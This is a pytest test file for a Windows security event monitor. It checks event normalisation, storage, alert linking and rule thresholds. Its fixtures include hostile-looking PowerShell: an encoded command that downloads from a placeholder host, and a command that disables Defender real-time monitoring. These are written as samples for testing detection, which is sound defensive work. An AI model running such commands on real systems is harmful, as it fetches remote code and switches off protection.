from __future__ import annotations

import json
from subprocess import CompletedProcess

from detection.analysis.security_event import SecurityEventAnalyzer
from endpoint_security.event_log import EventCollectionResult, WindowsEventCollector
from modern_ui.security_event_monitor import SecurityEventMonitorService
from models import SecurityEventRecord
from storage.database import Database
from storage.repositories import AlertRepository, RuleRepository, SecurityEventRepository


def event(
    event_id: int,
    record_id: int,
    *,
    timestamp: str = "2026-07-14T01:00:00+00:00",
    channel: str = "Security",
    source_ip: str = "10.0.0.42",
    user: str = "analyst",
    logon_type: str = "",
    command_line: str = "",
    details: dict[str, str] | None = None,
) -> SecurityEventRecord:
    return SecurityEventRecord(
        timestamp=timestamp,
        channel=channel,
        event_id=event_id,
        record_id=record_id,
        provider="Microsoft-Windows-Security-Auditing",
        computer="LAB-PC",
        user=user,
        source_ip=source_ip,
        logon_type=logon_type,
        command_line=command_line,
        summary=f"Test Windows event {event_id}",
        details=details or {"TargetUserName": user, "IpAddress": source_ip},
        severity="MEDIUM",
    )


def test_windows_event_normalization_extracts_security_fields():
    record = WindowsEventCollector.normalize(
        {
            "Channel": "Security",
            "EventId": 4625,
            "RecordId": 91,
            "TimeCreated": "2026-07-14T01:02:03Z",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": "LAB-PC",
            "Level": "Information",
            "Message": "An account failed to log on.\nAdditional detail.",
            "Data": {"TargetUserName": "guest", "IpAddress": "10.0.0.8", "LogonType": "3"},
        }
    )

    assert record.event_id == 4625
    assert record.record_id == 91
    assert record.user == "guest"
    assert record.source_ip == "10.0.0.8"
    assert record.logon_type == "3"
    assert record.severity == "MEDIUM"
    assert "Additional detail" in record.summary


def test_windows_event_collector_treats_no_matching_events_as_an_empty_channel(monkeypatch):
    def run(*_args, **kwargs):
        script = kwargs.get("args", _args[0] if _args else [""])[-1]
        assert "NoMatchingEventsFound" in script
        return CompletedProcess([], 0, stdout=json.dumps([]), stderr="")

    monkeypatch.setattr("endpoint_security.event_log.subprocess.run", run)
    collector = WindowsEventCollector(is_windows=True)
    result = collector.collect({})

    assert result.records == []
    assert result.unavailable_channels == []
    assert result.errors == []


def test_security_event_repository_is_idempotent_and_links_alerts(tmp_path):
    database = Database(tmp_path / "ids.db")
    database.initialize()
    repository = SecurityEventRepository(database)
    record = event(
        7045,
        12,
        channel="System",
        details={"ServiceName": "Updater", "ImagePath": r"powershell.exe -EncodedCommand SQBFAFgA"},
    )

    inserted = repository.add_many([record, record])
    assert len(inserted) == 1
    assert repository.count() == 1
    repository.update_cursor("System", 12)
    repository.update_cursor("System", 8)
    assert repository.cursors()["System"] == 12

    analyzer = SecurityEventAnalyzer(RuleRepository(database).list_all())
    alert = analyzer.process(inserted[0])[0]
    alert_id = repository.add_alert(inserted[0].id or 0, alert)
    linked = repository.get_for_alert(alert_id)
    assert linked is not None
    assert linked.event_id == 7045
    assert linked.alert_id == alert_id


def test_security_event_analyzer_applies_thresholds_and_powershell_indicators(tmp_path):
    database = Database(tmp_path / "ids.db")
    database.initialize()
    analyzer = SecurityEventAnalyzer(RuleRepository(database).list_all())
    alerts = []

    for index in range(5):
        alerts.extend(
            analyzer.process(
                event(
                    4625,
                    index + 1,
                    timestamp=f"2026-07-14T01:00:0{index}+00:00",
                )
            )
        )

    assert [alert.rule_id for alert in alerts] == ["WINDOWS_LOGON_FAILURE"]
    common_admin_script_alerts = analyzer.process(
        event(
            4104,
            20,
            channel="Microsoft-Windows-PowerShell/Operational",
            command_line="powershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
        )
    )
    assert common_admin_script_alerts == []

    powershell_alerts = analyzer.process(
        event(
            4104,
            21,
            channel="Microsoft-Windows-PowerShell/Operational",
            command_line="powershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA; DownloadString('https://example.invalid/a')",
        )
    )
    assert len(powershell_alerts) == 1
    assert powershell_alerts[0].rule_id == "POWERSHELL_SUSPICIOUS"
    assert "encoded-command" in powershell_alerts[0].evidence

    assert analyzer.process(
        event(
            4104,
            22,
            channel="Microsoft-Windows-PowerShell/Operational",
            command_line="powershell.exe Get-Process | Sort-Object CPU -Descending",
        )
    ) == []

    defender_disable = analyzer.process(
        event(
            4104,
            23,
            channel="Microsoft-Windows-PowerShell/Operational",
            command_line="Set-MpPreference -DisableRealtimeMonitoring $true",
        )
    )
    assert len(defender_disable) == 1
    assert "defender-disable" in defender_disable[0].evidence


def test_generic_service_install_is_retained_as_event_without_alert(tmp_path):
    database = Database(tmp_path / "ids.db")
    database.initialize()
    analyzer = SecurityEventAnalyzer(RuleRepository(database).list_all())

    alerts = analyzer.process(
        event(
            7045,
            30,
            channel="System",
            details={"ServiceName": "VendorUpdater", "ImagePath": r"C:\Program Files\Vendor\updater.exe"},
        )
    )

    assert alerts == []


def test_false_positive_defaults_migrate_once_without_overwriting_later_tuning(tmp_path):
    database = Database(tmp_path / "ids.db")
    database.initialize()
    with database.connect() as connection:
        connection.execute("UPDATE rules SET threshold = 20 WHERE id = 'PORT_SCAN'")
        connection.execute("UPDATE rules SET threshold = 80 WHERE id = 'ML_FLOW_ANOMALY'")
        connection.execute("UPDATE rules SET threshold = 4 WHERE id = 'BANDWIDTH_SPIKE'")
        connection.execute("UPDATE rules SET threshold = 3 WHERE id = 'POWERSHELL_SUSPICIOUS'")
        connection.execute("DELETE FROM settings WHERE key = 'migration_false_positive_tuning_v1'")

    database.initialize()
    migrated = {rule.id: rule.threshold for rule in RuleRepository(database).list_all()}
    assert migrated["PORT_SCAN"] == 30
    assert migrated["ML_FLOW_ANOMALY"] == 95
    assert migrated["BANDWIDTH_SPIKE"] == 8
    assert migrated["POWERSHELL_SUSPICIOUS"] == 4

    with database.connect() as connection:
        connection.execute("UPDATE rules SET threshold = 2 WHERE id = 'POWERSHELL_SUSPICIOUS'")
    database.initialize()
    retuned = next(rule for rule in RuleRepository(database).list_all() if rule.id == "POWERSHELL_SUSPICIOUS")
    assert retuned.threshold == 2


class StubCollector:
    is_windows = True

    def __init__(self, records: list[SecurityEventRecord]) -> None:
        self.records = records

    def collect(self, _cursors: dict[str, int], limit_per_channel: int = 200) -> EventCollectionResult:
        assert limit_per_channel == 200
        return EventCollectionResult(records=list(self.records))


def test_security_event_monitor_persists_new_events_and_preserves_them_after_alert_reset(tmp_path):
    database = Database(tmp_path / "ids.db")
    database.initialize()
    service = SecurityEventMonitorService(
        database,
        collector=StubCollector(
            [
                event(
                    7045,
                    44,
                    channel="System",
                    details={"ImagePath": r"C:\Users\Public\update.ps1", "ServiceName": "Updater"},
                )
            ]
        ),
    )  # type: ignore[arg-type]

    first = service.refresh_once()
    second = service.refresh_once()
    assert first["eventsAdded"] == 1
    assert first["alertsAdded"] == 1
    assert second["eventsAdded"] == 0
    assert SecurityEventRepository(database).count() == 1
    assert AlertRepository(database).count() == 1

    with database.connect() as connection:
        connection.execute("DELETE FROM alerts")
        connection.commit()

    assert AlertRepository(database).count() == 0
    assert SecurityEventRepository(database).count() == 1
    assert SecurityEventRepository(database).list_all()[0].alert_id is None
